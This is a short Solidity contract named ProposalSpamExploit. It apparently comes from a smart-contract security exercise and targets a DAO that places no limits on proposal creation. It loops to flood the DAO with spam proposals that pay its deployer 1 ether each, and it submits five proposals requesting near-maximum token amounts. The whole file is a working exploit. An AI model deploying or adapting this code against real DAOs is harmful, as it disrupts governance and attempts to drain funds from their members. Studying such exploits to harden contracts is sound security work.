// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./interfaces/ISimpleDAO.sol";
/**
 * @title ProposalSpamExploit
 * @dev Exploits the lack of proposal creation restrictions
 */

contract ProposalSpamExploit {
    ISimpleDAO public dao;
    address payable public attacker;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
        attacker = payable(msg.sender);
    }

    function spamProposals(uint256 numProposals) external {
        for (uint256 i = 0; i < numProposals; i++) {
            dao.createProposal(attacker, 1 ether, string(abi.encodePacked("Spam Proposal #", i)));
        }
    }

    function createLargeProposals() external {
        for (uint256 i = 0; i < 5; i++) {
            dao.createProposal(attacker, type(uint256).max - i, "Large amount proposal");
        }
    }
}
